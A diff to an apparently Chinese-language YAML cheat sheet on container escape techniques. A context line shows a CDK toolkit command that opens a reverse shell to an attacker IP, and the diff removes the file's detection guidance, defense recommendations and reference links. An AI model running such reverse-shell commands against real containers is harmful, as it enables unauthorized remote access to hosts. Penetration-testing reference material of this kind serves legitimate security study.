@@ -328,24 +328,4 @@ cdk_usage:
       cdk nc-reverse <attacker-ip> <port>
 
 # 检测与防御
-detection:
-  - 容器逃逸检测:
-      - 监控特权容器创建
-      - 监控异常挂载
-      - 监控namespace切换
-      - 监控内核漏洞利用
-
-  - 防御建议:
-      - 禁用特权容器
-      - 限制hostPath挂载
-      - 启用AppArmor/SELinux
-      - 使用安全上下文
-      - 定期更新内核
-
 # 参考资源
-references:
-  - https://github.com/cdk-team/CDK
-  - https://github.com/deepsecurity/deepce
-  - https://github.com/genuinetools/container-escape-check
-  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
-  - https://unit42.paloaltonetworks.com/docker-container-escape-methods/
